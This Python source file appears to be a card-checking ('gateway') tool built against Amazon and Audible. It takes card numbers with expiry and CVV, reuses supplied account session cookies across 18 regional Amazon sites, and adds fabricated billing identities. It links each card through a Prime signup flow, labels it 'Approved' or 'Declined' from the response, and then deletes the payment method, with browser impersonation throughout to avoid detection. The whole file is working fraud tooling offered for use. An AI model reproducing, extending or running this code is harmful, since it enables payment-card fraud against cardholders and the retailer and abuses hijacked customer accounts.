import re, random, string, json
from typing import Optional, Dict, Any
from curl_cffi.requests import Session
from urllib.parse import urlencode, quote

class Core:

    REFRESH_MESSAGE = 'Cookie expired ❌: Passkey authentication failed, please login again to refresh your cookie!'
    COUNTRY_MAP: Dict[str, Dict[str, str]] = {"ES": {"code": "acbes", "currency": "EUR", "lc": "lc-acbes", "lc_value": "es_ES", "domain": "amazon.es"}, "MX": {"code": "acbmx", "currency": "MXN", "lc": "lc-acbmx", "lc_value": "es_MX", "domain": "amazon.com.mx"}, "IT": {"code": "acbit", "currency": "EUR", "lc": "lc-acbit", "lc_value": "it_IT", "domain": "amazon.it"}, "US": {"code": "main",  "currency": "USD", "lc": "lc-main",  "lc_value": "en_US", "domain": "amazon.com"}, "DE": {"code": "acbde", "currency": "EUR", "lc": "lc-main",  "lc_value": "de_DE", "domain": "amazon.de"}, "BR": {"code": "acbbr", "currency": "BRL", "lc": "lc-main",  "lc_value": "en_US", "domain": "amazon.com.br"}, "AE": {"code": "acbae", "currency": "AED", "lc": "lc-acbae", "lc_value": "en_AE", "domain": "amazon.ae"}, "SG": {"code": "acbsg", "currency": "SGD", "lc": "lc-acbsg", "lc_value": "en_SG", "domain": "amazon.com.sg"}, "SA": {"code": "acbsa", "currency": "SAR", "lc": "lc-acbsa", "lc_value": "ar_AE", "domain": "amazon.sa"}, "CA": {"code": "acbca", "currency": "CAD", "lc": "lc-acbca", "lc_value": "en_CA", "domain": "amazon.ca"}, "PL": {"code": "acbpl", "currency": "PLN", "lc": "lc-acbpl", "lc_value": "pl_PL", "domain": "amazon.pl"}, "AU": {"code": "acbau", "currency": "AUD", "lc": "lc-acbpl", "lc_value": "en_AU", "domain": "amazon.com.au"}, "JP": {"code": "acbjp", "currency": "JPY", "lc": "lc-acbjp", "lc_value": "ja_JP", "domain": "amazon.co.jp"}, "FR": {"code": "acbfr", "currency": "EUR", "lc": "lc-acbfr", "lc_value": "fr_FR", "domain": "amazon.fr"}, "IN": {"code": "acbin", "currency": "INR", "lc": "lc-acbin", "lc_value": "en_IN", "domain": "amazon.in"}, "NL": {"code": "acbnl", "currency": "EUR", "lc": "lc-acbnl", "lc_value": "nl_NL", "domain": "amazon.nl"}, "UK": {"code": "acbuk", "currency": "GBP", "lc": "lc-acbuk", "lc_value": "en_GB", "domain": "amazon.co.uk"}, "TR": {"code": "acbtr", "currency": "TRY", "lc": "lc-acbtr", "lc_value": "tr_TR", "domain": "amazon.com.tr"}}


    @staticmethod
    def splitByDelimiters(delimiters: list[str], value: str) -> list[str]:
        pattern = "|".join(map(re.escape, delimiters))
        return re.split(pattern, value)


    @staticmethod
    def extractBetween(haystack: Optional[str], start: str, end: str, index: int = 1) -> Optional[str]:
        if haystack is None: return None
        try: return haystack.split(start)[index].split(end)[0]
        except: return None
        

    @staticmethod
    def generateRandomLetters(length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


    @staticmethod
    def extractRegionCode(cookie: str) -> Optional[str]:
        m = re.search(r"\b(main|acb[a-z]{2})\b", cookie, re.I)
        return m.group(1).lower() if m else None

    @classmethod
    def buildCookieData(cls, cookie: str) -> dict:
        region_code = cls.extractRegionCode(cookie.strip())
        if not region_code: return {"status": False, "message": "Region code not found in cookie."}

        country_map = {v["code"]: v for v in cls.COUNTRY_MAP.values()}

        if region_code not in country_map: return { "status": False, "message": f"Unsupported region code in cookie: {region_code}."}

        country = country_map[region_code]
        codes   = [v["code"] for v in cls.COUNTRY_MAP.values()] + ["acbuc"]
        for code in codes: cookie = cookie.replace(code, country["code"])
        cookie = re.sub(r"(i18n-prefs=)[A-Z]{3}",r"\1" + country["currency"],cookie)
        cookie = re.sub(rf"({re.escape(country['lc'])}=)[^;]+",r"\1" + country["lc_value"],cookie)
        return {"status": True, "cookie": cookie, "domain": country["domain"], "country_code": next(k for k, v in cls.COUNTRY_MAP.items() if v == country)}

    @staticmethod
    def buildCookieAudible(cookie: str, country: str = "US") -> str:
        nonBuildCookieData = Core.COUNTRY_MAP[country]
        cookie = re.sub(r"\b(acb[a-z]{2}|main)\b",nonBuildCookieData["code"],cookie)
        cookie = re.sub(r"(i18n-prefs=)[A-Z]{3}",r"\1" + nonBuildCookieData["currency"],cookie)
        return re.sub(rf"({re.escape(nonBuildCookieData['lc'])}=)[a-z]{{2}}_[A-Z]{{2}}",r"\1" + nonBuildCookieData["lc_value"],cookie)

    @staticmethod
    def parseCardString(cardString: str) -> dict | None:
        parts = Core.splitByDelimiters([":", "|", ";", ":", "/", " "], cardString)
        if len(parts) < 4: return {"status": False, "message": "Invalid card format. Expected format: number|exp_month|exp_year|cvv"}
        return {"status": True, "number": parts[0].strip(), "month": parts[1].strip().zfill(2), "year": parts[2].strip(), "cvv": parts[3].strip()}

    @staticmethod
    def createCookieJarFromString(session: Session, cookie: str, domain: str) -> Session:
        for pair in cookie.split(";"):
            if "=" not in pair: continue
            name, value = map(str.strip, pair.split("=", 1))
            session.cookies.set(name, value, domain=domain, path="/")

        return session

    @staticmethod
    def buildFlowBillingResult(response_amazon: str, audible_response: dict, country_code: str, card: dict) -> dict:
        rules = {
            "We’re sorry. We’re unable to complete your Prime signup at this time.": { "status": "Approved ✅", "message": "Card successfully linked."},
            "Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.": { "status": "Approved ✅", "message": "Card successfully linked."},
            "InvalidInput": { "status": "Declined ❌", "message": "Invalid card."},
            "HARDVET_VERIFICATION_FAILED": { "status": "Declined ❌", "message": "Card verification failed."},
        }

        buil_data = None

        for needle, result in rules.items():
            if needle in response_amazon:
                buil_data = {"status": True, "success": True if result["status"] == "Approved ✅" else False, "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}", "card_response": audible_response["message"], "response": result["message"], "apiResponse": result["status"], "gateway": f"Amazon ({country_code.upper()})", "Powered by": "Sxgitario @ Gateway Api Service"}

        return buil_data or {"status": False, "success": False, "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}", "card_response": audible_response["message"], "response": "Unknown response from Amazon.", "apiResponse": "Error ⚠️", "gateway": f"Amazon ({country_code.upper()})", "Powered by": "Sxgitario @ Gateway Api Service"}



class MetaData:

    @staticmethod
    def getBillingAddressId(session: Session, csrf_token: str, domain: str) -> Optional[str]:
        headers1 = { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36", "client": "MYXSettings", "Content-Type": "application/x-www-form-urlencoded", "Origin": f"https://www.{domain}", "X-Requested-With": "com.amazon.dee.app", "Referer": f"https://www.{domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca"}
        payload1 = 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' + quote(csrf_token)
        request1 = session.post(f"https://www.{domain}/hz/mycd/ajax", headers=headers1, data=payload1)
        return Core.extractBetween(request1 .text, 'AddressId":"', '"')

    
    @staticmethod
    def addBillingAddress(session: Session, domain: str, countryCode:str) -> None:
        COUNTRY_DATA = { 'US': {'countryCode': 'US', 'fullName': 'Mark O. Montanez', 'phone': '6065406572', 'line1': '8326 nw 68th st', 'city': 'Miami', 'state': 'Florida', 'postalCode': '33166'}, 'MX': {'countryCode': 'MX', 'fullName': 'Julian Talaveras', 'phone': '55' + str(random.randint(1000, 9999)) + str(random.randint(1000, 9999)), 'line1': 'Andador Tulipanes 991', 'city': 'TARIMBARO', 'state': 'MICHOACAN DE OCAMPO', 'postalCode': '58893'}, 'IT': {'countryCode': 'IT', 'fullName': 'Mark O. Montanez', 'phone': '33' + str(random.randint(10000000, 99999999)), 'line1': 'Via Roma 123', 'city': 'Milano', 'state': 'Milano', 'postalCode': '20121'}, 'AE': {'countryCode': 'AE', 'fullName': 'Mark O. Montanez', 'phone': '97150' + str(random.randint(1000000, 9999999)), 'line1': 'Sheikh Zayed Road 123', 'city': 'Dubai', 'state': 'Dubai', 'postalCode': '12345'}, 'DE': {'countryCode': 'DE', 'fullName': 'Mark O. Montanez', 'phone': '49' + str(random.randint(100000000, 999999999)), 'line1': 'Hauptstrasse 123', 'city': 'Berlin', 'state': 'Berlin', 'postalCode': '10115'}, 'BR': {'countryCode': 'BR', 'fullName': 'Mark O. Montanez', 'phone': '55' + str(random.randint(100000000, 999999999)), 'line1': 'Rua Falsa 123', 'city': 'São Paulo', 'state': 'São Paulo', 'postalCode': '01310-100'}, 'SG': {'countryCode': 'SG', 'fullName': 'Mark O. Montanez', 'phone': '65' + str(random.randint(10000000, 99999999)), 'line1': 'Orchard Road 123', 'city': 'Singapore', 'state': 'Singapore', 'postalCode': '238839'}, 'SA': {'countryCode': 'SA', 'fullName': 'Mark O. Montanez', 'phone': '96650' + str(random.randint(1000000, 9999999)), 'line1': 'King Fahd Road 123', 'city': 'Riyadh', 'state': 'Riyadh', 'postalCode': '11564'}, 'CA': {'countryCode': 'CA', 'fullName': 'Mark O. Montanez', 'phone': '1' + str(random.randint(1000000000, 9999999999)), 'line1': '123 Yonge Street', 'city': 'Toronto', 'state': 'Ontario', 'postalCode': 'M5V 2Z2'}, 'PL': {'countryCode': 'PL', 'fullName': 'Mark O. Montanez', 'phone': '48' + str(random.randint(100000000, 999999999)), 'line1': 'ul. Marszałkowska 123', 'city': 'Warszawa', 'state': 'Masovian', 'postalCode': '00-001'}, 'AU': {'countryCode': 'AU', 'fullName': 'Mark O. Montanez', 'phone': '61' + str(random.randint(100000000, 999999999)), 'line1': '123 George Street', 'city': 'Sydney', 'state': 'New South Wales', 'postalCode': '2000'}, 'JP': {'countryCode': 'JP', 'fullName': 'Mark O. Montanez', 'phone': '81' + str(random.randint(100000000, 999999999)), 'line1': 'Shibuya 123', 'city': 'Tokyo', 'state': 'Tokyo', 'postalCode': '150-0002'}, 'FR': {'countryCode': 'FR', 'fullName': 'Mark O. Montanez', 'phone': '33' + str(random.randint(100000000, 999999999)), 'line1': '123 Rue de Rivoli', 'city': 'Paris', 'state': 'Île-de-France', 'postalCode': '75001'}, 'IN': {'countryCode': 'IN', 'fullName': 'Mark O. Montanez', 'phone': '91' + str(random.randint(1000000000, 9999999999)), 'line1': 'MG Road 123', 'city': 'Mumbai', 'state': 'Maharashtra', 'postalCode': '400001'}, 'NL': {'countryCode': 'NL', 'fullName': 'Mark O. Montanez', 'phone': '31' + str(random.randint(100000000, 999999999)), 'line1': 'Damrak 123', 'city': 'Amsterdam', 'state': 'North Holland', 'postalCode': '1012 LP'}, 'UK': {'countryCode': 'UK', 'fullName': 'Mark O. Montanez', 'phone': '44' + str(random.randint(1000000000, 9999999999)), 'line1': '123 Oxford Street', 'city': 'London', 'state': 'England', 'postalCode': 'W1D 1LU'}, 'TR': {'countryCode': 'TR', 'fullName': 'Mark O. Montanez', 'phone': '90' + str(random.randint(1000000000, 9999999999)), 'line1': 'Bağdat Cd 123', 'city': 'Istanbul', 'state': 'Istanbul', 'postalCode': '34724'}}
        data = COUNTRY_DATA[countryCode.upper()]

        #//! Request 1: Get CSRF Token and Address Form Data
        headers1 = {"host": f"www.{domain}", "referer": f"https://www.{domain}/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", "viewport-width": "1536"}
        request1 = session.get(url = f"https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button", headers = headers1).text
        start_time  = Core.extractBetween(request1, 'name="address-ui-widgets-form-load-start-time" value="', '"')
        request_id  = Core.extractBetween(request1, '=AddView&hostPageRID=', '&', 1)
        csrf_token  = Core.extractBetween(request1, 'type="hidden" name="address-ui-widgets-csrfToken" value="', '"')
        address_jwt = Core.extractBetween(request1, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="', '"')
        customer_id = Core.extractBetween(request1, '"customerID":"', '"')
        ajax_token  = Core.extractBetween(request1, '"identity-address-ux-ajax-auth-token":"', '"')
        interaction_id = Core.extractBetween(request1, 'name="address-ui-widgets-address-wizard-interaction-id" value="', '"')
        csrf_token_address = Core.extractBetween(request1, "type='hidden' name='csrfToken' value='", "'")

        #//! Request 2: Verify Zip Code (if applicable)
        headers2 = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0", "Accept": "text/html;charset=UTF-8", "Accept-Language": "es-MX,es;q=0.9,en-US;q=0.8,en;q=0.7", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded", "Origin": f"https://www.{domain}", "Connection": "keep-alive", "Referer": f"https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "TE": "trailers"}
        payload2 = json.dumps({"JsonPayload": json.dumps({"operation": "MexicoAutopopulation", "data": {"CountryCode": data["countryCode"], "PostalCode": data["postalCode"]}, "ajaxToken": ajax_token})})
        request2 = session.post(url=f"https://www.{domain}/auiws/perform-ajax", headers=headers2, data=payload2)

        #//! Request 3:  Submit New Billing Address
        headers3 = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "es-MX,es;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": f"https://www.{domain}", "Connection": "keep-alive", "Referer": f"https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "TE": "trailers"}
        payload3 = {"csrfToken": csrf_token_address, "addressID": "", "address-ui-widgets-countryCode": data["countryCode"], "address-ui-widgets-enterAddressFullName": data["fullName"], "address-ui-widgets-enterAddressLine1": data["line1"], "address-ui-widgets-enterAddressPostalCode": data["postalCode"], "address-ui-widgets-enterAddressStateOrRegion": data["state"], "address-ui-widgets-enterAddressStateOrRegionFieldType": "String", "address-ui-widgets-enterAddressCity": data["city"], "address-ui-widgets-enterAddressCityFieldType": "String", "address-ui-widgets-enterAddressLine2": "CAMPESTRE TARIMBARO", "address-ui-widgets-enterAddressLine2FieldType": "Select", "address-ui-widgets-enterAddressPhoneNumber": data["phone"], "address-ui-widgets-previous-address-form-state-token": address_jwt, "address-ui-widgets-addr-details-gate-code": "", "address-ui-widgets-addressFormButtonText": "save", "address-ui-widgets-addressFormHideHeading": "true", "address-ui-widgets-heading-string-id": "", "address-ui-widgets-addressFormHideSubmitButton": "false", "address-ui-widgets-enableAddressDetails": "true", "address-ui-widgets-returnLegacyAddressID": "false", "address-ui-widgets-enableDeliveryInstructions": "true", "address-ui-widgets-enableAddressWizardInlineSuggestions": "false", "address-ui-widgets-enableEmailAddress": "false", "address-ui-widgets-enableAddressTips": "true", "address-ui-widgets-amazonBusinessGroupId": "", "address-ui-widgets-clientName": "YourAccountAddressBook", "address-ui-widgets-enableAddressWizardForm": "false", "address-ui-widgets-delivery-instructions-data": "", "address-ui-widgets-ab-delivery-instructions-data": "", "address-ui-widgets-address-wizard-interaction-id": interaction_id, "address-ui-widgets-obfuscated-customerId": customer_id, "address-ui-widgets-locationData": "", "address-ui-widgets-enableLatestAddressWizardForm": "false", "address-ui-widgets-avsSuppressSoftblock": "false", "address-ui-widgets-avsSuppressSuggestion": "false", "address-ui-widgets-csrfToken": csrf_token, "address-ui-widgets-form-load-start-time": start_time, "address-ui-widgets-clickstream-related-request-id": request_id, "address-ui-widgets-deliveryDestinationCity": "", "address-ui-widgets-deliveryDestinationNonUciPostalCode": "", "address-ui-widgets-autofill-location-spinner-loading-text": "Cargando", "address-ui-widgets-locale": ""}
        request3 = session.post(f"https://www.{domain}/a/addresses/add?ref=ya_address_book_add_post", headers=headers3, data=payload3)


    @staticmethod
    def deletePaymentMethod(cookie: str, payment: str, proxies: Optional[str] = None) -> None:
        cookie_data = {'cookie': cookie, 'domain': ''}
        tokens = ["audible.de", "audible.it", "audible.es", "audible.co.uk", "audible.com.au", "audible.ca", "audible.com", "audible.co.jp", "audible.fr"]

        for token in tokens:
            cookie_data['domain'] = token
            last_dot_position = cookie_data['domain'].rfind('.')
            country_code = cookie_data['domain'][last_dot_position + 1:] if last_dot_position != -1 else ''
            if country_code == 'com':  country_code = 'US'

            #//! Request 1: Get CSRF Token and Address ID
            cookie = Core.buildCookieAudible(cookie_data['cookie'], country_code.upper())
            headers1 = {"Host": f"www.{cookie_data['domain']}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9" if country_code not in ['AE', 'SA', 'JP'] else ('en-US,en;q=0.9,ar;q=0.8' if country_code == 'AE' or country_code == 'SA' else 'ja-JP,ja;q=0.9,en;q=0.8'), "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Cookie": cookie}
            request1 = Session(impersonate = random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"])).post(f"https://www.{cookie_data['domain']}/account/payments?ref=", headers=headers1)
            csrf = Core.extractBetween(request1.text, 'data-csrf-token="', '"')
            address = Core.extractBetween(request1.text, 'data-billing-address-id="', '"')
            if '///' in csrf: csrf = Core.extractBetween(Core.extractBetween(request1.text, 'data-payment-id="', 'payment-type'), 'data-csrf-token="', '"')

            #//! Request 2: Delete Payment Method
            headers2 = {"Host": f"www.{cookie_data['domain']}", "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"', "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "sec-ch-ua-platform": "Windows", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "en-US,en;q=0.9,ar;q=0.8" if country_code in ['AE', 'SA'] else ("ja-JP,ja;q=0.9,en;q=0.8" if country_code == 'JP' else "en-US,en;q=0.9"), "Origin": f"https://www.{cookie_data['domain']}", "Referer": f"https://www.{cookie_data['domain']}/account/payments?ref=", "Cookie": cookie}
            payload2 = f"isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId={payment}&billingAddressId={address}&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken={quote(csrf)}&index=0"
            request2 = Session(impersonate = random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"])).post(f"https://www.{cookie_data['domain']}/unified-payment/deactivate-payment-instrument", headers=headers2, data=payload2)

            if '"statusStringKey":"adbl_paymentswidget_delete_payment_success"' in request2.text:
                return {'status': True, 'message': 'Payment method deleted successfully.'}

        return {'status': False, 'message': 'Failed to delete payment method.'}
